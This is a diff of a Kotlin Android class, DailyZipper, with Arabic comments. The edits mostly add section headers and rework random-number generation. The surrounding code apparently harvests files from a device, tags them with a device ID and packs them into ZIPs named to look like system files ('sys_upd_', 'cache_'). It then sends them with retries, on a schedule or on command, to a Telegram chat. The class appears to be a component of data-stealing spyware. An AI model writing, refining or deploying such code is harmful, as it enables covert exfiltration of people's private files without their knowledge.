@@ -89,7 +89,10 @@ class DailyZipper(
         loadConfig()
     }
 
-    // ========== دوال مساعدة آمنة للخرائط (بدون أي [] أو .get) ==========
+    // ============================================================
+    //  دوال مساعدة آمنة للخرائط (بدون أي [] أو .get)
+    // ============================================================
+
     private fun getMapValue(map: Any?, key: String): Any? {
         if (map is Map<*, *>) {
             for (entry in map.entries) {
@@ -155,6 +158,10 @@ class DailyZipper(
         val maxBatches: Int
     )
 
+    // ============================================================
+    //  إدارة التكوين والإعدادات
+    // ============================================================
+
     private fun loadConfig() {
         if (!configFile.exists()) {
             saveConfig()
@@ -187,6 +194,10 @@ class DailyZipper(
             false
         }
     }
+
+    // ============================================================
+    //  الأدوات وفحوصات النظام
+    // ============================================================
 
     private fun getDeviceTag(): String {
         val ctx = appContext
@@ -221,6 +232,10 @@ class DailyZipper(
         }
     }
 
+    // ============================================================
+    //  أدوات الملفات والتجزئة
+    // ============================================================
+
     private fun fileHash(file: File): String? {
         if (!file.exists() || !file.isFile) return null
         return try {
@@ -238,15 +253,21 @@ class DailyZipper(
         }
     }
 
-    // ========== دالة توليد اسم ZIP مع إصلاح مشكلة .random() ==========
+    // ============================================================
+    //  توليد اسم ZIP (باستخدام java.util.Random فقط)
+    // ============================================================
+
     private fun generateZipName(): String {
         val prefixes = arrayOf("cache_", "sys_upd_", "tmp_vol_", "core_st_", "db_sync_")
         val dateStr = SimpleDateFormat("yyMMdd", Locale.US).format(Date())
         val chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
-        // ✅ استبدال chars.random() بـ Random().nextInt()
-        val random = Random()
-        val suffix = (1..6).map { chars[random.nextInt(chars.length)] }.joinToString("")
-        val prefix = prefixes[random.nextInt(prefixes.size)]
+        val rnd = java.util.Random()
+        val sb = StringBuilder()
+        for (i in 0 until 6) {
+            sb.append(chars[rnd.nextInt(chars.length)])
+        }
+        val suffix = sb.toString()
+        val prefix = prefixes[rnd.nextInt(prefixes.size)]
         return "${prefix}${dateStr}_${deviceTag}_$suffix.zip"
     }
 
@@ -270,6 +291,10 @@ class DailyZipper(
             true
         }
     }
+
+    // ============================================================
+    //  إرسال الملفات مع إعادة المحاولة (باستخدام دوال مساعدة آمنة)
+    // ============================================================
 
     private suspend fun safeSend(
         zipPath: String,
@@ -315,6 +340,10 @@ class DailyZipper(
         }
         return false
     }
+
+    // ============================================================
+    //  إجبار الإرسال الفوري
+    // ============================================================
 
     fun forceSendNow(chatId: Long? = null): Boolean {
         scope.launch {
@@ -363,6 +392,10 @@ class DailyZipper(
         }
         return true
     }
+
+    // ============================================================
+    //  الضغط والتغليف والتحزيم (مع إصلاح استخدام random)
+    // ============================================================
 
     private suspend fun packAndShip(
         files: List<File>,
@@ -497,9 +530,9 @@ class DailyZipper(
                         put("files", filesArr)
                     }
 
-                    // ✅ استبدال (1000..9999).random() بـ Random().nextInt()
-                    val random = Random()
-                    val randomNum = 1000 + random.nextInt(9000)
+                    // ✅ توليد رقم عشوائي باستخدام java.util.Random
+                    val rnd = java.util.Random()
+                    val randomNum = 1000 + rnd.nextInt(9000)
                     manifestFile = File(
                         harvestDir,
                         "manifest_${System.currentTimeMillis()}_$randomNum.json"
@@ -561,6 +594,10 @@ class DailyZipper(
         }
     }
 
+    // ============================================================
+    //  إنشاء أرشيف ZIP
+    // ============================================================
+
     private fun createZipArchive(
         zipFile: File,
         files: List<File>,
@@ -602,6 +639,10 @@ class DailyZipper(
             false
         }
     }
+
+    // ============================================================
+    //  التشغيل التلقائي (باستخدام دوال مساعدة آمنة)
+    // ============================================================
 
     fun run(): Boolean {
         scope.launch {
@@ -664,6 +705,10 @@ class DailyZipper(
         return true
     }
 
+    // ============================================================
+    //  أدوات مساعدة والإحصائيات
+    // ============================================================
+
     fun clearHashCache() {
         processedHashes.clear()
     }
@@ -688,6 +733,10 @@ class DailyZipper(
         result.put("size", totalSize)
         return result
     }
+
+    // ============================================================
+    //  دوال المساعدة والتواصل (Reflection Helpers)
+    // ============================================================
 
     private fun sendMessage(chatId: Long, text: String) {
         if (telegram == null) return
